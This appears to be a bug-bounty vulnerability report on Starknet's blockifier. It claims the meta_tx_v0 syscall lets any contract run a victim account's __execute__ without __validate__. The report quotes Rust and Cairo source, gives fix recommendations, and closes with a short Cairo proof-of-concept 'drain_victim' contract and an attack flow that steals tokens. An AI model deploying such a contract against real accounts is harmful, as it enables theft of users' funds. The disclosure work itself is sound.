### Title
Unrestricted `meta_tx_v0` Syscall Allows Any Contract to Invoke `__execute__` on Arbitrary Accounts, Bypassing `__validate__` — (File: `crates/blockifier/src/execution/syscalls/syscall_base.rs`)

---

### Summary

The `meta_tx_v0` syscall imposes no restriction on which contract may invoke it. Any deployed contract can call `meta_tx_v0(victim_account, __execute__, [attacker_calldata], [fake_signature])` during execution, causing the victim account's `__execute__` entry point to run with attacker-controlled calldata and `caller_address = 0`, while completely skipping `__validate__`. Accounts that do not assert `tx_info.version != 0` inside `__execute__` — the common case for modern multicall accounts that delegate signature verification entirely to `__validate__` — are fully compromised.

---

### Finding Description

**The `block_direct_execute_call` guard and its gap**

Production versioned constants set `block_direct_execute_call = true`. [1](#0-0) 

The guard is enforced inside `call_contract` via `maybe_block_direct_execute_call`:

```rust
pub(crate) fn maybe_block_direct_execute_call(
    &mut self,
    selector: EntryPointSelector,
) -> SyscallResult<()> {
    let versioned_constants = &self.context.tx_context.block_context.versioned_constants;
    if versioned_constants.block_direct_execute_call
        && selector == selector_from_name(EXECUTE_ENTRY_POINT_NAME)
    {
        return Err(SyscallExecutionError::Revert { error_data: vec![INVALID_ARGUMENT_FELT] });
    }
    Ok(())
}
``` [2](#0-1) 

This call is present in both the VM and Native `call_contract` implementations. [3](#0-2) 

**`meta_tx_v0` has no equivalent guard and no caller restriction**

The entire body of `meta_tx_v0` in `SyscallHandlerBase` is:

```rust
pub fn meta_tx_v0(
    &mut self,
    contract_address: ContractAddress,
    entry_point_selector: EntryPointSelector,
    calldata: Calldata,
    signature: TransactionSignature,
    remaining_gas: &mut u64,
) -> SyscallResult<Vec<Felt>> {
    self.increment_syscall_linear_factor_by(&SyscallSelector::MetaTxV0, calldata.0.len());
    if self.context.execution_mode == ExecutionMode::Validate {
        self.reject_syscall_in_validate_mode("meta_tx_v0")?;
    }
    if entry_point_selector != selector_from_name(EXECUTE_ENTRY_POINT_NAME) {
        return Err(SyscallExecutionError::Revert { error_data: vec![INVALID_ARGUMENT_FELT] });
    }
    // ... builds CallEntryPoint with caller_address = ContractAddress::default() (= 0)
    // ... replaces tx_context: sender_address = contract_address, version = 0, nonce = 0
    // ... calls execute_inner_call(entry_point, ...)
    // ... restores old tx_context
``` [4](#0-3) 

The two checks present are:
1. Reject in `Validate` mode — irrelevant, the attack runs in `Execute` mode.
2. Require selector == `__execute__` — this is the attack vector, not a protection.

There is **no check** that `self.call.storage_address == contract_address` (caller must be the target account), no whitelist, and no `maybe_block_direct_execute_call` call.

The Cairo OS implementation mirrors this exactly: [5](#0-4) 

The syscall is reachable from the main `execute_syscalls` dispatch loop with no additional gate:

```cairo
assert selector = META_TX_V0_SELECTOR;
execute_meta_tx_v0(block_context=block_context, caller_execution_context=execution_context);
``` [6](#0-5) 

**What the syscall injects into the victim's execution context**

When `meta_tx_v0(victim, __execute__, calldata, sig)` is called, the victim's `__execute__` sees:

| Field | Value |
|---|---|
| `get_caller_address()` | `0` (ORIGIN_ADDRESS) — passes the standard `assert(caller.is_zero())` guard |
| `tx_info.account_contract_address` | `victim` |
| `tx_info.version` | `0` |
| `tx_info.nonce` | `0` |
| `tx_info.signature` | attacker-supplied |
| `tx_info.transaction_hash` | deterministic hash of attacker-supplied fields | [7](#0-6) 

**Why modern accounts are vulnerable**

Modern multicall accounts (version 1 / version 3) perform signature verification exclusively in `__validate__`. Their `__execute__` only checks `caller_address == 0` and then blindly executes the provided `Call` array. The `account_with_real_validate` feature contract shows the only safe pattern — asserting `tx_info.version != 0` — but this is not enforced by the protocol:

```cairo
fn __execute__(ref self: ContractState, mut calls: Array<Call>) -> Array<Span<felt252>> {
    assert(starknet::get_caller_address().is_zero(), 'INVALID_CALLER');
    let tx_info = starknet::get_tx_info().unbox();
    assert(tx_info.version != 0, 'INVALID_TX_VERSION');
``` [8](#0-7) 

Any account that omits the `version != 0` check is fully exploitable.

---

### Impact Explanation

An attacker deploys a malicious contract and submits a single invoke transaction. During execution, the malicious contract calls `meta_tx_v0(victim, __execute__, [transfer_token_to_attacker], [])`. The victim's `__execute__` runs with `caller_address = 0` (passing its own guard) and executes the attacker-supplied call array — transferring tokens, approving the attacker, or performing any other state mutation — without the victim ever signing anything. The wrong storage values and token balances are committed to the block state.

This matches: **Critical. Wrong state, receipt, event, L1 message, class hash, storage value, or revert result from blockifier/syscall/execution logic for accepted input.**

---

### Likelihood Explanation

- Trigger is unprivileged: any account can deploy a contract and submit a transaction.
- No special timing, no mempool race, no privileged role required.
- The only precondition on the victim is the absence of a `version != 0` check in `__execute__`, which is the default for standard multicall accounts.
- Likelihood: **Medium** (requires identifying a victim account without the version guard, which is common in practice).

---

### Recommendation

1. **Enforce caller identity**: inside `meta_tx_v0`, assert `self.call.storage_address == contract_address` so only the target account can initiate a meta-transaction on itself. This mirrors the relayer pattern where the account itself is the entry point.
2. **Apply `block_direct_execute_call` to `meta_tx_v0`**: if the flag is set, reject `meta_tx_v0` calls from contracts other than the target account.
3. **Protocol-level version check**: enforce at the OS/blockifier level that `__execute__` called via `meta_tx_v0` must return `VALIDATED` only after verifying the provided signature, analogous to how `__validate__` is enforced for normal transactions.

---

### Proof of Concept

```cairo
// Malicious relayer contract
#[external(v0)]
fn drain_victim(ref self: ContractState, victim: ContractAddress, token: ContractAddress) {
    // Build calldata: one Call { to: token, selector: transfer, calldata: [attacker, amount] }
    let calls = array![Call { to: token, selector: TRANSFER_SELECTOR, calldata: array![ATTACKER, MAX_AMOUNT] }];
    
    // meta_tx_v0 calls victim.__execute__(calls) with caller_address=0, version=0
    // __validate__ is never invoked; victim has no version check → transfer executes
    meta_tx_v0_syscall(
        address: victim,
        entry_point_selector: EXECUTE_ENTRY_POINT_SELECTOR,
        calldata: serialize(calls).span(),
        signature: array![].span(),   // arbitrary; never verified
    ).unwrap_syscall();
}
```

Attack flow:
```
Attacker → invoke(malicious_contract.drain_victim(victim, token))
  → meta_tx_v0(victim, __execute__, [transfer(attacker, MAX)], [])
    → victim.__execute__([transfer(attacker, MAX)])   // caller=0 ✓, version=0 unchecked
      → token.transfer(attacker, MAX)                 // funds stolen
```

The `meta_tx_v0` implementation in `syscall_base.rs` confirms no caller check exists between lines 286 and 300, and the `execute_inner_call` at line 350 proceeds unconditionally. [9](#0-8) [10](#0-9)

### Citations

**File:** crates/blockifier/resources/blockifier_versioned_constants_0_14_0.json (L118-118)
```json
    "block_direct_execute_call": true,
```

**File:** crates/blockifier/src/execution/syscalls/syscall_base.rs (L286-367)
```rust
    pub fn meta_tx_v0(
        &mut self,
        contract_address: ContractAddress,
        entry_point_selector: EntryPointSelector,
        calldata: Calldata,
        signature: TransactionSignature,
        remaining_gas: &mut u64,
    ) -> SyscallResult<Vec<Felt>> {
        self.increment_syscall_linear_factor_by(&SyscallSelector::MetaTxV0, calldata.0.len());
        if self.context.execution_mode == ExecutionMode::Validate {
            self.reject_syscall_in_validate_mode("meta_tx_v0")?;
        }
        if entry_point_selector != selector_from_name(EXECUTE_ENTRY_POINT_NAME) {
            return Err(SyscallExecutionError::Revert { error_data: vec![INVALID_ARGUMENT_FELT] });
        }
        let entry_point = CallEntryPoint {
            class_hash: None,
            code_address: Some(contract_address),
            entry_point_type: EntryPointType::External,
            entry_point_selector,
            calldata: calldata.clone(),
            storage_address: contract_address,
            caller_address: ContractAddress::default(),
            call_type: CallType::Call,
            // NOTE: this value might be overridden later on.
            initial_gas: *remaining_gas,
        };

        let old_tx_context = self.context.tx_context.clone();
        let only_query = old_tx_context.tx_info.only_query();

        // Compute meta-transaction hash.
        let transaction_hash = InvokeTransactionV0 {
            max_fee: Fee(0),
            signature: signature.clone(),
            contract_address,
            entry_point_selector,
            calldata,
        }
        .calculate_transaction_hash(
            &self.context.tx_context.block_context.chain_info.chain_id,
            &signed_tx_version(&TransactionVersion::ZERO, &TransactionOptions { only_query }),
        )?;

        let class_hash = self.state.get_class_hash_at(contract_address)?;

        // Replace `tx_context`.
        let new_tx_info = TransactionInfo::Deprecated(DeprecatedTransactionInfo {
            common_fields: CommonAccountFields {
                transaction_hash,
                version: TransactionVersion::ZERO,
                signature,
                nonce: Nonce(0.into()),
                sender_address: contract_address,
                only_query,
            },
            max_fee: Fee(0),
        });
        self.context.tx_context = Arc::new(TransactionContext {
            block_context: old_tx_context.block_context.clone(),
            tx_info: new_tx_info,
        });

        // No error should be propagated until we restore the old `tx_context`.
        let result = self.execute_inner_call(entry_point, remaining_gas).map_err(|error| {
            SyscallExecutionError::from_self_or_revert(error.try_extract_revert().map_original(
                |error| {
                    // TODO(lior): Change to meta-tx specific error.
                    error.as_call_contract_execution_error(
                        class_hash,
                        contract_address,
                        entry_point_selector,
                    )
                },
            ))
        });

        // Restore the old `tx_context`.
        self.context.tx_context = old_tx_context;

        result
    }
```

**File:** crates/blockifier/src/execution/syscalls/syscall_base.rs (L491-502)
```rust
    pub(crate) fn maybe_block_direct_execute_call(
        &mut self,
        selector: EntryPointSelector,
    ) -> SyscallResult<()> {
        let versioned_constants = &self.context.tx_context.block_context.versioned_constants;
        if versioned_constants.block_direct_execute_call
            && selector == selector_from_name(EXECUTE_ENTRY_POINT_NAME)
        {
            return Err(SyscallExecutionError::Revert { error_data: vec![INVALID_ARGUMENT_FELT] });
        }
        Ok(())
    }
```

**File:** crates/blockifier/src/execution/native/syscall_handler.rs (L520-523)
```rust
        let selector = EntryPointSelector(entry_point_selector);
        self.base
            .maybe_block_direct_execute_call(selector)
            .map_err(|e| self.handle_error(remaining_gas, e))?;
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/syscall_impls.cairo (L291-405)
```text
func execute_meta_tx_v0{
    range_check_ptr,
    syscall_ptr: felt*,
    builtin_ptrs: BuiltinPointers*,
    contract_state_changes: DictAccess*,
    contract_class_changes: DictAccess*,
    revert_log: RevertLogEntry*,
    outputs: OsCarriedOutputs*,
}(block_context: BlockContext*, caller_execution_context: ExecutionContext*) {
    alloc_locals;

    let request = cast(syscall_ptr + RequestHeader.SIZE, MetaTxV0Request*);
    local calldata_start: felt* = request.calldata_start;
    local calldata_size = request.calldata_end - calldata_start;

    let specific_base_gas_cost = (
        META_TX_V0_GAS_COST + META_TX_V0_CALLDATA_FACTOR_GAS_COST * calldata_size
    );
    let (success, remaining_gas) = reduce_syscall_base_gas(
        specific_base_gas_cost=specific_base_gas_cost, request_struct_size=MetaTxV0Request.SIZE
    );
    if (success == FALSE) {
        // Not enough gas to execute the syscall.
        return ();
    }

    local contract_address = request.contract_address;
    local selector = request.selector;
    local caller_execution_info: ExecutionInfo* = caller_execution_context.execution_info;
    local old_tx_info: TxInfo* = caller_execution_info.tx_info;

    if (selector != EXECUTE_ENTRY_POINT_SELECTOR) {
        write_failure_response(remaining_gas=remaining_gas, failure_felt=ERROR_INVALID_ARGUMENT);
        return ();
    }

    // Sanity check: Verify that `signature` is a valid Sierra array.
    assert_nn_le(request.signature_end - request.signature_start, SIERRA_ARRAY_LEN_BOUND - 1);

    let (state_entry: StateEntry*) = dict_read{dict_ptr=contract_state_changes}(
        key=contract_address
    );

    // Compute the meta-transaction hash.
    let pedersen_ptr = builtin_ptrs.selectable.pedersen;
    with pedersen_ptr {
        let meta_tx_hash = compute_meta_tx_v0_hash(
            contract_address=contract_address,
            entry_point_selector=selector,
            calldata=calldata_start,
            calldata_size=calldata_size,
            chain_id=old_tx_info.chain_id,
        );
    }
    update_pedersen_in_builtin_ptrs(pedersen_ptr=pedersen_ptr);

    // Prepare execution context.
    tempvar new_tx_info = new TxInfo(
        version=0,
        account_contract_address=contract_address,
        max_fee=0,
        signature_start=request.signature_start,
        signature_end=request.signature_end,
        transaction_hash=meta_tx_hash,
        chain_id=old_tx_info.chain_id,
        nonce=0,
        resource_bounds_start=cast(0, ResourceBounds*),
        resource_bounds_end=cast(0, ResourceBounds*),
        tip=0,
        paymaster_data_start=cast(0, felt*),
        paymaster_data_end=cast(0, felt*),
        nonce_data_availability_mode=0,
        fee_data_availability_mode=0,
        account_deployment_data_start=cast(0, felt*),
        account_deployment_data_end=cast(0, felt*),
        proof_facts_start=cast(0, felt*),
        proof_facts_end=cast(0, felt*),
    );

    let (deprecated_tx_info_ptr: DeprecatedTxInfo*) = alloc();
    tempvar execution_context: ExecutionContext* = new ExecutionContext(
        entry_point_type=ENTRY_POINT_TYPE_EXTERNAL,
        class_hash=state_entry.class_hash,
        calldata_size=calldata_size,
        calldata=calldata_start,
        execution_info=new ExecutionInfo(
            block_info=caller_execution_info.block_info,
            tx_info=new_tx_info,
            caller_address=ORIGIN_ADDRESS,
            contract_address=contract_address,
            selector=selector,
        ),
        deprecated_tx_info=deprecated_tx_info_ptr,
    );
    fill_deprecated_tx_info(tx_info=new_tx_info, dst=execution_context.deprecated_tx_info);

    // Since we process the revert log backwards, entries before this point belong to the calling
    // contract.
    assert [revert_log] = RevertLogEntry(
        selector=CHANGE_CONTRACT_ENTRY, value=caller_execution_info.contract_address
    );
    let revert_log = &revert_log[1];

    contract_call_helper(
        remaining_gas=remaining_gas,
        block_context=block_context,
        execution_context=execution_context,
    );

    // Entries before this point belong to the callee.
    assert [revert_log] = RevertLogEntry(selector=CHANGE_CONTRACT_ENTRY, value=contract_address);
    let revert_log = &revert_log[1];

    return ();
}
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/execute_syscalls.cairo (L355-362)
```text
    assert selector = META_TX_V0_SELECTOR;
    execute_meta_tx_v0(block_context=block_context, caller_execution_context=execution_context);
    %{ OsLoggerExitSyscall %}
    return execute_syscalls(
        block_context=block_context,
        execution_context=execution_context,
        syscall_ptr_end=syscall_ptr_end,
    );
```

**File:** crates/blockifier_test_utils/resources/feature_contracts/cairo1/account_with_real_validate.cairo (L83-89)
```text
        fn __execute__(ref self: ContractState, mut calls: Array<Call>) -> Array<Span<felt252>> {
            // Validate caller.
            assert(starknet::get_caller_address().is_zero(), 'INVALID_CALLER');

            // Check the version here, since version 0 transaction skip the __validate__ function.
            let tx_info = starknet::get_tx_info().unbox();
            assert(tx_info.version != 0, 'INVALID_TX_VERSION');
```
